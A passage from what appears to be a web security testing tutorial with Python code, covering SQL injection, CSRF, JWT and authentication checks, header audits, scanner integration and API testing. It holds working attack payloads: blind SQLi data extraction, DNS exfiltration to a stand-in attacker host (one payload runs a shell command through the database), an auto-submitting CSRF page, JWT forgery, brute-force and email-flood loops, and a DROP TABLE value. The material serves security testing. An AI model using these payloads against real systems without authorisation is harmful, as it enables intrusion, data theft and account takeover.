    """Test for time-based blind SQL injection"""
    
    time_based_payloads = {
        'MySQL': "1' AND SLEEP(5)--",
        'PostgreSQL': "1'; SELECT pg_sleep(5)--",
        'MSSQL': "1'; WAITFOR DELAY '0:0:5'--",
        'Oracle': "1' AND DBMS_LOCK.SLEEP(5)=0--",
    }
    
    for db_type, payload in time_based_payloads.items():
        start = time.time()
        response = requests.get(f"{base_url}?{param_name}={payload}", timeout=10)
        elapsed = time.time() - start
        
        if elapsed >= 5:
            print(f"❌ VULNERABLE: Time-based blind SQLi ({db_type})")
            print(f"   Response time: {elapsed:.2f}s")
            
            # Extract data using time-based technique
            extracted = extract_data_time_based(base_url, param_name, db_type)
            print(f"   Extracted: {extracted}")
            return True
    
    return False

def extract_data_time_based(base_url, param_name, db_type):
    """Extract data using time-based blind SQL injection"""
    
    if db_type == 'MySQL':
        delay_func = "SLEEP(5)"
    elif db_type == 'PostgreSQL':
        delay_func = "pg_sleep(5)"
    elif db_type == 'MSSQL':
        delay_func = "WAITFOR DELAY '0:0:5'"
    else:
        return None
    
    # Extract database version (first 10 characters)
    version = ""
    for pos in range(1, 11):
        for ascii_val in range(32, 127):
            payload = f"1' AND IF(ASCII(SUBSTRING(@@version,{pos},1))={ascii_val},{delay_func},0)--"
            
            start = time.time()
            try:
                requests.get(f"{base_url}?{param_name}={payload}", timeout=7)
            except:
                pass
            elapsed = time.time() - start
            
            if elapsed >= 5:
                version += chr(ascii_val)
                print(f"Version so far: {version}")
                break
    
    return version
```

**Out-of-Band SQL Injection**

```python
def test_out_of_band_sqli(base_url, param_name):
    """Test for out-of-band SQL injection using DNS exfiltration"""
    
    # Use Burp Collaborator or similar service
    collaborator_domain = "attacker.burpcollaborator.net"
    
    oob_payloads = {
        'MySQL': f"1' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT @@version),'.{collaborator_domain}\\\\share'))--",
        'MSSQL': f"1'; EXEC master..xp_dirtree '//{collaborator_domain}/share'--",
        'Oracle': f"1' UNION SELECT UTL_INADDR.get_host_address('{collaborator_domain}') FROM dual--",
        'PostgreSQL': f"1'; COPY (SELECT '') TO PROGRAM 'nslookup {collaborator_domain}'--",
    }
    
    for db_type, payload in oob_payloads.items():
        response = requests.get(f"{base_url}?{param_name}={payload}")
        print(f"Sent {db_type} OOB payload. Check Collaborator for DNS lookups.")
        
    print("\n⚠ Note: Check your Burp Collaborator or DNS logger for interactions")
    print("   If DNS lookups received, out-of-band SQLi confirmed")
```

**Second-Order SQL Injection**

```python
def test_second_order_sqli(base_url, session):
    """Test for second-order SQL injection"""
    
    # Step 1: Register user with SQL injection payload in username
    malicious_username = "admin'--"
    
    register_response = session.post(f"{base_url}/register", data={
        'username': malicious_username,
        'password': 'Test123!',
        'email': 'test@example.com'
    })
    
    if register_response.status_code != 200:
        print("Registration failed, cannot test second-order SQLi")
        return
    
    # Step 2: Login with this user
    login_response = session.post(f"{base_url}/login", data={
        'username': malicious_username,
        'password': 'Test123!'
    })
    
    # Step 3: Trigger the vulnerability by accessing profile or making changes
    # The stored username might be used in SQL queries
    profile_response = session.get(f"{base_url}/profile")
    
    # Check if we can see other users' data (admin's data)
    if 'admin@' in profile_response.text or 'role: admin' in profile_response.text:
        print("❌ CRITICAL: Second-order SQL injection confirmed")
        print(f"   Username '{malicious_username}' caused SQL injection when retrieved")
    
    # Try changing password (might trigger second-order SQLi)
    change_pwd_response = session.post(f"{base_url}/change-password", data={
        'current_password': 'Test123!',
        'new_password': 'NewPass123!'
    })
    
    # Check if multiple passwords were changed (SQL injection affected other users)
    # This would require checking from another account
```

## CSRF (Cross-Site Request Forgery) Testing

CSRF attacks force authenticated users to perform unwanted actions on a web application.

```python
def test_csrf_protection(base_url):
    """Comprehensive CSRF testing"""
    
    # Test 1: Check for CSRF tokens in forms
    response = requests.get(f"{base_url}/profile/edit")
    
    if 'csrf' not in response.text.lower() and '_token' not in response.text.lower():
        print("⚠ No CSRF token found in form")
    
    # Test 2: Submit form without CSRF token
    session = login_user(base_url, 'testuser', 'password')
    
    # Legitimate request with token
    edit_page = session.get(f"{base_url}/profile/edit")
    soup = BeautifulSoup(edit_page.text, 'html.parser')
    csrf_token = soup.find('input', {'name': 'csrf_token'})
    
    if csrf_token:
        # Try without token
        response_no_token = session.post(f"{base_url}/profile/edit", data={
            'name': 'Changed Name',
            'email': 'new@example.com'
        })
        
        if response_no_token.status_code == 200 and 'error' not in response_no_token.text.lower():
            print("❌ VULNERABLE: CSRF protection bypassed - no token required")
        
        # Try with invalid token
        response_bad_token = session.post(f"{base_url}/profile/edit", data={
            'name': 'Changed Name',
            'email': 'new@example.com',
            'csrf_token': 'invalid_token_123'
        })
        
        if response_bad_token.status_code == 200 and 'error' not in response_bad_token.text.lower():
            print("❌ VULNERABLE: CSRF protection bypassed - invalid token accepted")
        
        # Try with token from different user
        another_session = login_user(base_url, 'otheruser', 'password')
        other_edit = another_session.get(f"{base_url}/profile/edit")
        other_soup = BeautifulSoup(other_edit.text, 'html.parser')
        other_token = other_soup.find('input', {'name': 'csrf_token'})['value']
        
        response_wrong_user = session.post(f"{base_url}/profile/edit", data={
            'name': 'Changed Name',
            'email': 'new@example.com',
            'csrf_token': other_token
        })
        
        if response_wrong_user.status_code == 200:
            print("❌ VULNERABLE: CSRF token from different user accepted")
    
    # Test 3: Check SameSite cookie attribute
    for cookie in session.cookies:
        if 'samesite' not in str(cookie).lower():
            print(f"⚠ Cookie '{cookie.name}' missing SameSite attribute")
    
    # Test 4: Check Referer header validation
    headers_no_referer = {k: v for k, v in session.headers.items() if k.lower() != 'referer'}
    response = session.post(f"{base_url}/profile/delete", 
                           headers=headers_no_referer,
                           data={'csrf_token': csrf_token['value'] if csrf_token else ''})
    
    if response.status_code == 200:
        print("⚠ No Referer header validation")

def generate_csrf_poc(target_url, form_data):
    """Generate CSRF proof-of-concept HTML"""
    
    html = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>CSRF PoC</title>
    </head>
    <body>
        <h1>CSRF Proof of Concept</h1>
        <form id="csrfForm" action="{target_url}" method="POST">
    """
    
    for key, value in form_data.items():
        html += f'        <input type="hidden" name="{key}" value="{value}" />\n'
    
    html += """
        </form>
        <script>
            // Auto-submit on page load
            document.getElementById('csrfForm').submit();
        </script>
    </body>
    </html>
    """
    
    return html

# Usage
poc_html = generate_csrf_poc(
    "https://victim.com/profile/delete",
    {"confirm": "yes"}
)
print(poc_html)
```

## Authentication and Authorization Testing

Comprehensive authentication testing covers multiple aspects beyond just login functionality.

```python
def comprehensive_auth_testing(base_url):
    """Complete authentication and authorization test suite"""
    
    issues = []
    
    # 1. Password Policy Testing
    weak_passwords = [
        'password', '123456', 'admin', 'test', 'qwerty',
        '', 'a', '12345', 'password123', 'admin123'
    ]
    
    for pwd in weak_passwords:
        response = requests.post(f"{base_url}/register", data={
            'username': 'testuser' + str(random.randint(1000, 9999)),
            'password': pwd,
            'email': 'test@example.com'
        })
        
        if response.status_code == 200:
            issues.append(f"Weak password accepted: '{pwd}'")
    
    # 2. Brute Force Protection
    for i in range(50):
        response = requests.post(f"{base_url}/login", data={
            'username': 'admin',
            'password': f'wrong{i}'
        })
        
        if i == 49 and response.status_code != 429:
            issues.append("No rate limiting after 50 failed attempts")
    
    # 3. Username Enumeration
    # Register a known user
    requests.post(f"{base_url}/register", data={
        'username': 'knownuser',
        'password': 'Test123!',
        'email': 'known@example.com'
    })
    
    # Try login with existing vs non-existing username
    response_exists = requests.post(f"{base_url}/login", data={
        'username': 'knownuser',
        'password': 'wrongpassword'
    })
    
    response_not_exists = requests.post(f"{base_url}/login", data={
        'username': 'nonexistentuser99999',
        'password': 'wrongpassword'
    })
    
    if response_exists.text != response_not_exists.text:
        issues.append("Username enumeration possible via different error messages")
    
    # Check timing difference
    start = time.time()
    requests.post(f"{base_url}/login", data={'username': 'knownuser', 'password': 'x'})
    time_exists = time.time() - start
    
    start = time.time()
    requests.post(f"{base_url}/login", data={'username': 'nonexistent999', 'password': 'x'})
    time_not_exists = time.time() - start
    
    if abs(time_exists - time_not_exists) > 0.1:
        issues.append(f"Username enumeration via timing (diff: {abs(time_exists - time_not_exists):.3f}s)")
    
    # 4. Session Management Testing
    session = login_user(base_url, 'testuser', 'Test123!')
    
    # Session fixation
    old_session_id = session.cookies.get('SESSIONID')
    session.post(f"{base_url}/login", data={'username': 'testuser', 'password': 'Test123!'})
    new_session_id = session.cookies.get('SESSIONID')
    
    if old_session_id == new_session_id:
        issues.append("Session fixation: Session ID not regenerated after login")
    
    # Session timeout
    # This would need to wait 30+ minutes in real testing
    # For demo, just check if there's a timeout mechanism
    
    # Concurrent sessions
    session1 = login_user(base_url, 'testuser', 'Test123!')
    session2 = login_user(base_url, 'testuser', 'Test123!')
    
    # Check if both sessions are valid
    r1 = session1.get(f"{base_url}/api/profile")
    r2 = session2.get(f"{base_url}/api/profile")
    
    if r1.status_code == 200 and r2.status_code == 200:
        issues.append("Multiple concurrent sessions allowed (may be intended)")
    
    # 5. JWT Testing (if JWT is used)
    token = get_jwt_token(base_url, 'testuser', 'Test123!')
    if token:
        jwt_issues = test_jwt_security(token, base_url)
        issues.extend(jwt_issues)
    
    # 6. OAuth/SSO Testing
    oauth_issues = test_oauth_flow(base_url)
    issues.extend(oauth_issues)
    
    # 7. Multi-Factor Authentication
    mfa_issues = test_mfa_implementation(base_url)
    issues.extend(mfa_issues)
    
    # 8. Password Reset Flow
    reset_issues = test_password_reset(base_url)
    issues.extend(reset_issues)
    
    return issues

def test_jwt_security(token, base_url):
    """Test JWT token security"""
    issues = []
    
    # Decode JWT
    parts = token.split('.')
    if len(parts) != 3:
        return ["Invalid JWT format"]
    
    header = json.loads(base64.b64decode(parts[0] + '=='))
    payload = json.loads(base64.b64decode(parts[1] + '=='))
    
    # Test 1: None algorithm
    header_none = header.copy()
    header_none['alg'] = 'none'
    
    tampered_token = base64.b64encode(json.dumps(header_none).encode()).decode().rstrip('=')
    tampered_token += '.' + parts[1] + '.'
    
    response = requests.get(f"{base_url}/api/protected",
                          headers={'Authorization': f'Bearer {tampered_token}'})
    if response.status_code == 200:
        issues.append("JWT accepts 'none' algorithm - CRITICAL")
    
    # Test 2: Weak secret
    weak_secrets = ['secret', 'password', 'jwt', '123456', '']
    for secret in weak_secrets:
        import hmac
        import hashlib
        
        message = f"{parts[0]}.{parts[1]}"
        signature = base64.b64encode(
            hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
        ).decode().rstrip('=')
        
        cracked_token = f"{parts[0]}.{parts[1]}.{signature}"
        
        response = requests.get(f"{base_url}/api/protected",
                              headers={'Authorization': f'Bearer {cracked_token}'})
        if response.status_code == 200:
            issues.append(f"JWT uses weak secret: '{secret}' - CRITICAL")
            break
    
    # Test 3: Token expiration
    if 'exp' not in payload:
        issues.append("JWT has no expiration claim")
    else:
        exp_time = payload['exp']
        if exp_time - time.time() > 86400:  # More than 24 hours
            issues.append(f"JWT expiration too long: {(exp_time - time.time()) / 3600:.1f} hours")
    
    # Test 4: Modify claims
    modified_payload = payload.copy()
    modified_payload['role'] = 'admin'
    modified_payload['user_id'] = 1  # Assuming admin is ID 1
    
    tampered_payload = base64.b64encode(json.dumps(modified_payload).encode()).decode().rstrip('=')
    tampered_token = f"{parts[0]}.{tampered_payload}.{parts[2]}"
    
    response = requests.get(f"{base_url}/api/admin",
                          headers={'Authorization': f'Bearer {tampered_token}'})
    if response.status_code == 200:
        issues.append("JWT signature not validated - CRITICAL")
    
    return issues

def test_password_reset(base_url):
    """Test password reset functionality"""
    issues = []
    
    # Request password reset
    response = requests.post(f"{base_url}/forgot-password", data={
        'email': 'testuser@example.com'
    })
    
    # Test 1: User enumeration via reset
    response_exists = requests.post(f"{base_url}/forgot-password", 
                                   data={'email': 'known@example.com'})
    response_not_exists = requests.post(f"{base_url}/forgot-password",
                                       data={'email': 'nobody@example.com'})
    
    if response_exists.text != response_not_exists.text:
        issues.append("User enumeration via password reset")
    
    # Test 2: Reset token predictability
    # Request multiple reset tokens and analyze
    tokens = []
    for i in range(5):
        resp = requests.post(f"{base_url}/forgot-password",
                           data={'email': f'test{i}@example.com'})
        # Extract token from email/response (implementation-specific)
        # For demo purposes, assume we can get tokens
    
    # Check if tokens are sequential or predictable
    # This would require actual token extraction
    
    # Test 3: Token expiration
    # Get a reset token and wait to see if it expires
    
    # Test 4: Token reuse
    # Use a token, then try to use it again
    
    # Test 5: No rate limiting on reset requests
    for i in range(100):
        requests.post(f"{base_url}/forgot-password",
                     data={'email': 'victim@example.com'})
    
    # If no rate limiting, this could lead to email bombing
    issues.append("Check for rate limiting on password reset requests")
    
    return issues
```

## Security Headers and Content Security Policy

Security headers provide an additional layer of defense against various attacks.

```python
def audit_security_headers(url):
    """Comprehensive security headers audit"""
    
    response = requests.get(url)
    headers = response.headers
    
    audit_results = {
        'critical': [],
        'high': [],
        'medium': [],
        'low': [],
        'pass': []
    }
    
    # Strict-Transport-Security (HSTS)
    hsts = headers.get('Strict-Transport-Security')
    if not hsts:
        audit_results['high'].append("Missing HSTS header")
    else:
        # Parse max-age
        import re
        max_age_match = re.search(r'max-age=(\d+)', hsts)
        if max_age_match:
            max_age = int(max_age_match.group(1))
            if max_age < 31536000:  # Less than 1 year
                audit_results['medium'].append(f"HSTS max-age too short: {max_age}s")
            else:
                audit_results['pass'].append(f"HSTS properly configured: {max_age}s")
        
        if 'includeSubDomains' not in hsts:
            audit_results['medium'].append("HSTS missing includeSubDomains")
        
        if 'preload' not in hsts:
            audit_results['low'].append("HSTS missing preload directive")
    
    # X-Frame-Options
    xfo = headers.get('X-Frame-Options')
    if not xfo:
        audit_results['high'].append("Missing X-Frame-Options (clickjacking risk)")
    elif xfo.upper() not in ['DENY', 'SAMEORIGIN']:
        audit_results['medium'].append(f"Weak X-Frame-Options: {xfo}")
    else:
        audit_results['pass'].append(f"X-Frame-Options: {xfo}")
    
    # X-Content-Type-Options
    xcto = headers.get('X-Content-Type-Options')
    if not xcto or xcto.lower() != 'nosniff':
        audit_results['medium'].append("Missing or incorrect X-Content-Type-Options")
    else:
        audit_results['pass'].append("X-Content-Type-Options: nosniff")
    
    # Content-Security-Policy
    csp = headers.get('Content-Security-Policy')
    if not csp:
        audit_results['high'].append("Missing Content-Security-Policy")
    else:
        csp_issues = analyze_csp(csp)
        audit_results['medium'].extend(csp_issues)
        if not csp_issues:
            audit_results['pass'].append("CSP present")
    
    # X-XSS-Protection
    xxp = headers.get('X-XSS-Protection')
    if not xxp:
        audit_results['low'].append("Missing X-XSS-Protection (deprecated but still useful)")
    elif xxp != '1; mode=block':
        audit_results['low'].append(f"Weak X-XSS-Protection: {xxp}")
    
    # Referrer-Policy
    rp = headers.get('Referrer-Policy')
    if not rp:
        audit_results['medium'].append("Missing Referrer-Policy")
    elif rp not in ['no-referrer', 'strict-origin-when-cross-origin', 'strict-origin']:
        audit_results['low'].append(f"Weak Referrer-Policy: {rp}")
    else:
        audit_results['pass'].append(f"Referrer-Policy: {rp}")
    
    # Permissions-Policy / Feature-Policy
    pp = headers.get('Permissions-Policy') or headers.get('Feature-Policy')
    if not pp:
        audit_results['low'].append("Missing Permissions-Policy")
    else:
        audit_results['pass'].append("Permissions-Policy present")
    
    # X-Powered-By (information disclosure)
    xpb = headers.get('X-Powered-By')
    if xpb:
        audit_results['low'].append(f"Information disclosure via X-Powered-By: {xpb}")
    
    # Server header
    server = headers.get('Server')
    if server and server not in ['cloudflare', 'AmazonS3']:
        audit_results['low'].append(f"Server version disclosed: {server}")
    
    # Set-Cookie security
    for cookie in response.cookies:
        cookie_issues = []
        cookie_str = str(cookie)
        
        if 'secure' not in cookie_str.lower():
            cookie_issues.append("missing Secure flag")
        if 'httponly' not in cookie_str.lower():
            cookie_issues.append("missing HttpOnly flag")
        if 'samesite' not in cookie_str.lower():
            cookie_issues.append("missing SameSite attribute")
        
        if cookie_issues:
            audit_results['medium'].append(
                f"Cookie '{cookie.name}': {', '.join(cookie_issues)}"
            )
    
    # Print report
    print("\n" + "="*70)
    print("SECURITY HEADERS AUDIT REPORT")
    print("="*70)
    
    for severity in ['critical', 'high', 'medium', 'low']:
        if audit_results[severity]:
            print(f"\n[{severity.upper()}]")
            for issue in audit_results[severity]:
                print(f"  ❌ {issue}")
    
    if audit_results['pass']:
        print(f"\n[PASS]")
        for item in audit_results['pass']:
            print(f"  ✓ {item}")
    
    return audit_results

def analyze_csp(csp_header):
    """Analyze Content-Security-Policy for common issues"""
    issues = []
    
    # Parse directives
    directives = {}
    for directive in csp_header.split(';'):
        directive = directive.strip()
        if directive:
            parts = directive.split(None, 1)
            if len(parts) == 2:
                directives[parts[0]] = parts[1]
            else:
                directives[parts[0]] = ''
    
    # Check for unsafe directives
    dangerous_values = ['unsafe-inline', 'unsafe-eval', '*']
    
    for directive, value in directives.items():
        for dangerous in dangerous_values:
            if dangerous in value:
                issues.append(f"CSP directive '{directive}' contains '{dangerous}'")
    
    # Check for missing important directives
    important_directives = [
        'default-src', 'script-src', 'style-src', 'img-src',
        'connect-src', 'font-src', 'object-src', 'frame-ancestors'
    ]
    
    for directive in important_directives:
        if directive not in directives:
            if directive == 'default-src':
                issues.append(f"CSP missing critical directive: {directive}")
            # Don't warn about others if default-src exists
            elif 'default-src' not in directives:
                issues.append(f"CSP missing directive: {directive}")
    
    # Check for data: URIs in script-src
    if 'script-src' in directives and 'data:' in directives['script-src']:
        issues.append("CSP allows data: URIs in script-src (XSS risk)")
    
    return issues

def test_csp_bypass(url):
    """Test for CSP bypass techniques"""
    
    response = requests.get(url)
    csp = response.headers.get('Content-Security-Policy')
    
    if not csp:
        print("No CSP to bypass")
        return
    
    print(f"Testing CSP: {csp}\n")
    
    # Parse CSP
    directives = {}
    for directive in csp.split(';'):
        directive = directive.strip()
        if directive:
            parts = directive.split(None, 1)
            if len(parts) == 2:
                directives[parts[0]] = parts[1].split()
            else:
                directives[parts[0]] = []
    
    script_src = directives.get('script-src', directives.get('default-src', []))
    
    # Test for common bypasses
    bypass_attempts = []
    
    # 1. JSONP endpoints bypass
    jsonp_domains = ['google.com', 'googleapis.com', 'gstatic.com', 'ajax.googleapis.com']
    allowed_jsonp = [d for d in jsonp_domains if any(d in src for src in script_src)]
    if allowed_jsonp:
        bypass_attempts.append(f"Potential JSONP bypass via: {', '.join(allowed_jsonp)}")
    
    # 2. unsafe-inline with nonce/hash
    if 'unsafe-inline' in script_src and any('nonce-' in s or 'sha' in s for s in script_src):
        bypass_attempts.append("unsafe-inline with nonce/hash may allow bypass in older browsers")
    
    # 3. Base tag injection
    if 'base-uri' not in directives:
        bypass_attempts.append("Missing base-uri directive allows <base> tag injection")
    
    # 4. Dangling markup injection
    if 'script-src' in directives and '<' not in ''.join(script_src):
        bypass_attempts.append("Check for dangling markup injection opportunities")
    
    # 5. File upload + script execution
    if "'self'" in script_src:
        bypass_attempts.append("'self' in script-src - check for file upload leading to XSS")
    
    for attempt in bypass_attempts:
        print(f"⚠ {attempt}")
```

## SAST and DAST Tools Integration

Static Application Security Testing (SAST) and Dynamic Application Security Testing (DAST) are complementary approaches.

### SAST Integration

```python
# integrate_semgrep.py
import subprocess
import json

def run_semgrep_scan(project_path, output_file='semgrep-results.json'):
    """Run Semgrep SAST scan"""
    
    cmd = [
        'semgrep',
        '--config=auto',  # Use Semgrep Registry rules
        '--json',
        '--output', output_file,
        project_path
    ]
    
    print(f"Running Semgrep scan on {project_path}...")
    result = subprocess.run(cmd, capture_output=True, text=True)
    
    if result.returncode != 0:
        print(f"Semgrep completed with findings")
    
    # Parse results
    with open(output_file, 'r') as f:
        results = json.load(f)
    
    return parse_semgrep_results(results)

def parse_semgrep_results(results):
    """Parse and categorize Semgrep findings"""
    
    findings_by_severity = {
        'CRITICAL': [],
        'HIGH': [],
        'MEDIUM': [],
        'LOW': []
    }
    
    for finding in results.get('results', []):
        severity = finding.get('extra', {}).get('severity', 'MEDIUM').upper()
        
        finding_data = {
            'rule': finding.get('check_id'),
            'message': finding.get('extra', {}).get('message'),
            'file': finding.get('path'),
            'line': finding.get('start', {}).get('line'),
            'code': finding.get('extra', {}).get('lines'),
            'fix': finding.get('extra', {}).get('fix')
        }
        
        findings_by_severity[severity].append(finding_data)
    
    # Print report
    print("\n" + "="*70)
    print("SEMGREP SAST RESULTS")
    print("="*70)
    
    total = 0
    for severity in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW']:
        count = len(findings_by_severity[severity])
        total += count
        if count > 0:
            print(f"\n[{severity}] {count} findings")
            for finding in findings_by_severity[severity][:5]:  # Show first 5
                print(f"  • {finding['rule']}")
                print(f"    {finding['file']}:{finding['line']}")
                print(f"    {finding['message'][:80]}")
    
    print(f"\nTotal findings: {total}")
    
    return findings_by_severity

# Example: Run for different languages
def scan_project(project_path):
    """Comprehensive SAST scan"""
    
    # Semgrep
    semgrep_results = run_semgrep_scan(project_path)
    
    # Additional language-specific scans
    if os.path.exists(os.path.join(project_path, 'package.json')):
        print("\nRunning npm audit...")
        subprocess.run(['npm', 'audit', '--json'], cwd=project_path)
    
    if os.path.exists(os.path.join(project_path, 'requirements.txt')):
        print("\nRunning pip-audit...")
        subprocess.run(['pip-audit'], cwd=project_path)
    
    if os.path.exists(os.path.join(project_path, 'go.mod')):
        print("\nRunning gosec...")
        subprocess.run(['gosec', './...'], cwd=project_path)
```

### DAST with OWASP ZAP

```python
# owasp_zap_integration.py
from zapv2 import ZAPv2
import time

def run_zap_scan(target_url, api_key='your-api-key'):
    """Run OWASP ZAP automated scan"""
    
    # Connect to ZAP (must be running)
    zap = ZAPv2(apikey=api_key, proxies={
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    })
    
    print(f"Starting ZAP scan for {target_url}")
    
    # Spider the target
    print("1. Spidering...")
    scan_id = zap.spider.scan(target_url)
    
    while int(zap.spider.status(scan_id)) < 100:
        print(f"   Spider progress: {zap.spider.status(scan_id)}%")
        time.sleep(5)
    
    print("   Spider completed")
    
    # Ajax Spider for JavaScript-heavy apps
    print("2. Ajax spidering...")
    zap.ajaxSpider.scan(target_url)
    
    while zap.ajaxSpider.status == 'running':
        print(f"   Ajax spider running...")
        time.sleep(5)
    
    print("   Ajax spider completed")
    
    # Active Scan
    print("3. Active scanning...")
    scan_id = zap.ascan.scan(target_url)
    
    while int(zap.ascan.status(scan_id)) < 100:
        print(f"   Active scan progress: {zap.ascan.status(scan_id)}%")
        time.sleep(10)
    
    print("   Active scan completed")
    
    # Get results
    alerts = zap.core.alerts(baseurl=target_url)
    
    return parse_zap_alerts(alerts)

def parse_zap_alerts(alerts):
    """Parse and categorize ZAP alerts"""
    
    findings_by_risk = {
        'High': [],
        'Medium': [],
        'Low': [],
        'Informational': []
    }
    
    for alert in alerts:
        risk = alert.get('risk', 'Informational')
        
        finding = {
            'name': alert.get('alert'),
            'description': alert.get('description'),
            'url': alert.get('url'),
            'param': alert.get('param'),
            'attack': alert.get('attack'),
            'evidence': alert.get('evidence'),
            'solution': alert.get('solution'),
            'reference': alert.get('reference'),
            'cwe': alert.get('cweid'),
            'wasc': alert.get('wascid')
        }
        
        findings_by_risk[risk].append(finding)
    
    # Print report
    print("\n" + "="*70)
    print("OWASP ZAP DAST RESULTS")
    print("="*70)
    
    for risk in ['High', 'Medium', 'Low', 'Informational']:
        count = len(findings_by_risk[risk])
        if count > 0:
            print(f"\n[{risk.upper()}] {count} findings")
            for finding in findings_by_risk[risk][:3]:  # Show first 3
                print(f"  • {finding['name']}")
                print(f"    URL: {finding['url'][:60]}...")
                if finding['param']:
                    print(f"    Parameter: {finding['param']}")
    
    return findings_by_risk

def authenticated_zap_scan(target_url, login_url, username, password):
    """Run ZAP scan with authentication"""
    
    zap = ZAPv2(apikey='your-api-key')
    
    # Set up context
    context_name = 'AuthContext'
    context_id = zap.context.new_context(context_name)
    
    # Include in context
    zap.context.include_in_context(context_name, f"{target_url}.*")
    
    # Set up authentication
    login_request_data = f"username={username}&password={password}"
    
    zap.authentication.set_authentication_method(
        contextid=context_id,
        authmethodname='formBasedAuthentication',
        authmethodconfigparams=f"loginUrl={login_url}&loginRequestData={login_request_data}"
    )
    
    # Set up user
    user_id = zap.users.new_user(context_id, 'testuser')
    zap.users.set_authentication_credentials(
        context_id,
        user_id,
        f"username={username}&password={password}"
    )
    zap.users.set_user_enabled(context_id, user_id, True)
    
    # Force user mode
    zap.forcedUser.set_forced_user(context_id, user_id)
    zap.forcedUser.set_forced_user_mode_enabled(True)
    
    # Now run scan as authenticated user
    return run_zap_scan(target_url)
```

### Burp Suite Integration

```python
# burp_suite_integration.py
import requests
import json

class BurpSuiteAPI:
    """Interface with Burp Suite Professional REST API"""
    
    def __init__(self, base_url='http://127.0.0.1:1337', api_key=None):
        self.base_url = base_url
        self.api_key = api_key
        self.headers = {'X-API-Key': api_key} if api_key else {}
    
    def create_scan(self, target_url, scan_type='crawl_and_audit'):
        """Create a new scan task"""
        
        payload = {
            'scan_configurations': [{
                'type': scan_type,
                'name': f'Scan of {target_url}'
            }],
            'urls': [target_url]
        }
        
        response = requests.post(
            f'{self.base_url}/v0.1/scan',
            headers=self.headers,
            json=payload
        )
        
        if response.status_code == 201:
            task_id = response.headers.get('Location').split('/')[-1]
            print(f"Scan created: {task_id}")
            return task_id
        else:
            print(f"Failed to create scan: {response.text}")
            return None
    
    def get_scan_status(self, task_id):
        """Get scan progress"""
        
        response = requests.get(
            f'{self.base_url}/v0.1/scan/{task_id}',
            headers=self.headers
        )
        
        if response.status_code == 200:
            data = response.json()
            return {
                'status': data.get('scan_status'),
                'metrics': data.get('scan_metrics')
            }
        return None
    
    def get_scan_issues(self, task_id):
        """Retrieve issues found in scan"""
        
        response = requests.get(
            f'{self.base_url}/v0.1/scan/{task_id}/issues',
            headers=self.headers
        )
        
        if response.status_code == 200:
            return response.json().get('issues', [])
        return []
    
    def wait_for_scan(self, task_id):
        """Wait for scan to complete"""
        
        import time
        
        while True:
            status = self.get_scan_status(task_id)
            if not status:
                break
            
            scan_status = status['status']
            metrics = status.get('metrics', {})
            
            print(f"Status: {scan_status}")
            print(f"  Requests made: {metrics.get('requests_made', 0)}")
            print(f"  Requests queued: {metrics.get('requests_queued', 0)}")
            print(f"  Audit items completed: {metrics.get('audit_items_completed', 0)}")
            
            if scan_status in ['succeeded', 'failed']:
                break
            
            time.sleep(30)
        
        return scan_status

def run_burp_scan(target_url, api_key):
    """Run complete Burp Suite scan"""
    
    burp = BurpSuiteAPI(api_key=api_key)
    
    # Create scan
    task_id = burp.create_scan(target_url)
    if not task_id:
        return
    
    # Wait for completion
    final_status = burp.wait_for_scan(task_id)
    
    if final_status == 'succeeded':
        # Get issues
        issues = burp.get_scan_issues(task_id)
        
        # Categorize by severity
        by_severity = {}
        for issue in issues:
            severity = issue.get('severity')
            if severity not in by_severity:
                by_severity[severity] = []
            by_severity[severity].append(issue)
        
        # Print report
        print("\n" + "="*70)
        print("BURP SUITE SCAN RESULTS")
        print("="*70)
        
        for severity in ['high', 'medium', 'low', 'info']:
            if severity in by_severity:
                print(f"\n[{severity.upper()}] {len(by_severity[severity])} issues")
                for issue in by_severity[severity][:5]:
                    print(f"  • {issue.get('name')}")
                    print(f"    {issue.get('origin')}")
                    print(f"    Confidence: {issue.get('confidence')}")
        
        return by_severity
```

## API Security Testing

APIs require specialized security testing approaches.

```python
def comprehensive_api_security_test(base_url):
    """Complete API security test suite"""
    
    issues = []
    
    # 1. Test authentication
    # No auth
    response = requests.get(f"{base_url}/api/users")
    if response.status_code == 200:
        issues.append("API endpoint accessible without authentication")
    
    # Weak token
    response = requests.get(f"{base_url}/api/users",
                          headers={'Authorization': 'Bearer invalid'})
    if response.status_code == 200:
        issues.append("API accepts invalid authentication tokens")
    
    # 2. Test rate limiting
    for i in range(1000):
        response = requests.get(f"{base_url}/api/search?q=test")
        if i == 999 and response.status_code != 429:
            issues.append("No rate limiting on API endpoints")
            break
    
    # 3. Test mass assignment
    response = requests.post(f"{base_url}/api/users", json={
        'username': 'newuser',
        'email': 'new@example.com',
        'password': 'Test123!',
        'role': 'admin',  # Attempt to set privileged role
        'is_verified': True
    })
    
    if response.status_code == 200:
        user_data = response.json()
        if user_data.get('role') == 'admin':
            issues.append("Mass assignment vulnerability - able to set role")
    
    # 4. Test GraphQL specific issues
    if '/graphql' in base_url:
        graphql_issues = test_graphql_security(f"{base_url}/graphql")
        issues.extend(graphql_issues)
    
    # 5. Test API versioning issues
    api_versions = ['/v1/', '/v2/', '/api/v1/', '/api/v2/']
    for version in api_versions:
        test_url = base_url.replace('/api/', version)
        response = requests.get(test_url)
        if response.status_code == 200:
            # Check if old version has different security
            pass
    
    # 6. Test CORS misconfigurations
    origins_to_test = [
        'https://evil.com',
        'null',
        'https://attacker.com'
    ]
    
    for origin in origins_to_test:
        response = requests.get(f"{base_url}/api/data",
                              headers={'Origin': origin})
        acao = response.headers.get('Access-Control-Allow-Origin')
        if acao == origin or acao == '*':
            issues.append(f"CORS misconfiguration: Allows origin {origin}")
    
    # 7. Test excessive data exposure
    session = login_user(base_url, 'testuser', 'password')
    response = session.get(f"{base_url}/api/users/me")
    user_data = response.json()
    
    sensitive_fields = ['password', 'password_hash', 'ssn', 'credit_card', 'api_key']
    for field in sensitive_fields:
        if field in user_data:
            issues.append(f"API exposes sensitive field: {field}")
    
    # 8. Test injection in API parameters
    injection_params = [
        ("id", "1' OR '1'='1"),
        ("filter", "'; DROP TABLE users--"),
        ("sort", "$where: '1==1'"),  # NoSQL
    ]
    
    for param, payload in injection_params:
        response = requests.get(f"{base_url}/api/items",
                              params={param: payload})
        if response.status_code == 500 or 'error' in response.text.lower():
            issues.append(f"Possible injection in parameter: {param}")
    
    # 9. Test function level authorization
